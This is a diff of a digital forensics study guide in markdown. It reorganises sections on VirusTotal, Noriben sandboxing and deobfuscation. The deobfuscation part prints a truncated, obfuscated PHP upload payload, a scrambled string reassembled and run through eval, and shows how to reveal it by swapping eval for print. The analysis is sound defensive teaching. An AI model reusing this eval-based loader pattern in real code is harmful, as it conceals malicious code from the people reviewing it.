@@ -892,23 +892,6 @@ lzop -d -k flag2.lzop -o flag3
 lzip -d -k flag3
 ```
 
-Virus total can be useful to get some information from  
-
-![Pasted image 20230212170655](https://user-images.githubusercontent.com/50979196/221450418-70e59b66-d291-4a83-9540-d71735b7e4a5.png)
-
-
-
-## Sandboxes
-Noriben can be used for dynamic analysis monitoring creation of processes.
-
-Start from command line, run executable in question, when finihed stop Noriben, get output 
-
-![image](https://github.com/dbissell6/DFIR/assets/50979196/f3f80f0d-7a6b-4042-9219-187570dba020)
-
-
-![image](https://github.com/dbissell6/DFIR/assets/50979196/a3718827-65db-4f74-8afa-b5a53e902430)
-
-
 
 ## Reconstructing 
 
@@ -944,6 +927,63 @@ Foremost is a tool that is used for file recovery and reconstruction. It can be 
 Foremost uses a technique called file carving to recover files from disk images or other sources. It scans through the input data looking for specific file headers and footers, and then extracts the data between them. Foremost supports a wide range of file types, including images, audio files, videos, documents, and archives.
 
 Foremost can be used in a variety of scenarios, such as when trying to recover deleted files, investigating a cybercrime incident, or recovering data from a damaged disk. It is a powerful tool for file recovery and reconstruction and can help in restoring valuable data that may have been lost or deleted.
+
+
+## Malware Analysis
+
+Virus total can be useful to get some information from  
+
+![Pasted image 20230212170655](https://user-images.githubusercontent.com/50979196/221450418-70e59b66-d291-4a83-9540-d71735b7e4a5.png)
+
+
+
+### Sandboxes
+Noriben can be used for dynamic analysis monitoring creation of processes.
+
+Start from command line, run executable in question, when finihed stop Noriben, get output 
+
+![image](https://github.com/dbissell6/DFIR/assets/50979196/f3f80f0d-7a6b-4042-9219-187570dba020)
+
+
+![image](https://github.com/dbissell6/DFIR/assets/50979196/a3718827-65db-4f74-8afa-b5a53e902430)
+
+## Deobfuscation
+
+Deobfuscation is the process of removing obfuscation from code or data, making it more readable and easier to understand. Obfuscation is often used by malware authors to hide their malicious code from analysis or detection, which makes deobfuscation a critical skill for digital forensics and incident response (DFIR) professionals. Deobfuscation techniques can range from simple string decoding to complex disassembly and reverse engineering, and require a deep understanding of programming languages and software architectures. This section will cover some of the most common deobfuscation techniques used in DFIR, and provide practical examples and tools to help you improve your deobfuscation skills.
+
+This can be dealt with live or static methods. 
+
+Almost any computer code(.exe,.php,.py) can be obfuscated.
+
+### Example PHP
+
+Below is obfuscated php. Often an easy win in these senarios involves being able to find an eval call. If we can find this we can get the deobfuscated version of the code.
+```
+map-update.php                
+-----------------------------310973569542634246533468492466
+Content-Disposition: form-data; name="uploaded_file"; filename="galacticmap.php"
+Content-Type: application/x-php
+
+<?php 
+snipped...
+
+$iyzQ5h8qf6 .= "\\o>\n u]d> wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF <'  hnv\n {e >< n>\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS"; 
+$iyzQ5h8qf6 .= "Ie }pi'b<ee <e  \n).<t l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:>oconi d\$ on]d - "; 
+$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$>bhe\$r    )\"d> a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d<>occ>t <  ?>  dppc  d"; 
+$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv<nime-yif's[re m'ib< (m\"a / {d\"\" =orh  oC-s -heom<apbip &p  [ &'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t"; 
+$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr<cr\nl h  r . .in   "; 
+for($i = 0; $i < $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = ""; 
+for($i = 0; $i < (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r < $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; } 
+$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz)); 
+$bhrTeZXazQ = "?>$bhrTeZXazQ"; 
+eval( $bhrTeZXazQ ); 
+?>
+```
+Changing that eval to a print, then running the code will show us what would have been evaluated. 
+
+![image](https://user-images.githubusercontent.com/50979196/229360590-6be77a92-d4a9-474b-9b15-82386ab91033.png)
+![image](https://user-images.githubusercontent.com/50979196/229360633-63def415-8df9-478c-bd7a-bff3b24d5648.png)
+
 
 ## Stegnography 
 ### Intro
@@ -1016,42 +1056,7 @@ A Java-based tool that can be used to analyze and manipulate images for steganog
 
 https://stegonline.georgeom.net/checklist
 
-## Deobfuscation
 
-Deobfuscation is the process of removing obfuscation from code or data, making it more readable and easier to understand. Obfuscation is often used by malware authors to hide their malicious code from analysis or detection, which makes deobfuscation a critical skill for digital forensics and incident response (DFIR) professionals. Deobfuscation techniques can range from simple string decoding to complex disassembly and reverse engineering, and require a deep understanding of programming languages and software architectures. This section will cover some of the most common deobfuscation techniques used in DFIR, and provide practical examples and tools to help you improve your deobfuscation skills.
-
-This can be dealt with live or static methods. 
-
-Almost any computer code(.exe,.php,.py) can be obfuscated.
-
-### Example PHP
-
-Below is obfuscated php. Often an easy win in these senarios involves being able to find an eval call. If we can find this we can get the deobfuscated version of the code.
-```
-map-update.php                
------------------------------310973569542634246533468492466
-Content-Disposition: form-data; name="uploaded_file"; filename="galacticmap.php"
-Content-Type: application/x-php
-
-<?php 
-snipped...
-
-$iyzQ5h8qf6 .= "\\o>\n u]d> wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF <'  hnv\n {e >< n>\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS"; 
-$iyzQ5h8qf6 .= "Ie }pi'b<ee <e  \n).<t l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:>oconi d\$ on]d - "; 
-$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$>bhe\$r    )\"d> a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d<>occ>t <  ?>  dppc  d"; 
-$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv<nime-yif's[re m'ib< (m\"a / {d\"\" =orh  oC-s -heom<apbip &p  [ &'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t"; 
-$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr<cr\nl h  r . .in   "; 
-for($i = 0; $i < $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = ""; 
-for($i = 0; $i < (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r < $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; } 
-$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz)); 
-$bhrTeZXazQ = "?>$bhrTeZXazQ"; 
-eval( $bhrTeZXazQ ); 
-?>
-```
-Changing that eval to a print, then running the code will show us what would have been evaluated. 
-
-![image](https://user-images.githubusercontent.com/50979196/229360590-6be77a92-d4a9-474b-9b15-82386ab91033.png)
-![image](https://user-images.githubusercontent.com/50979196/229360633-63def415-8df9-478c-bd7a-bff3b24d5648.png)
 
 
 # Memory Dumps
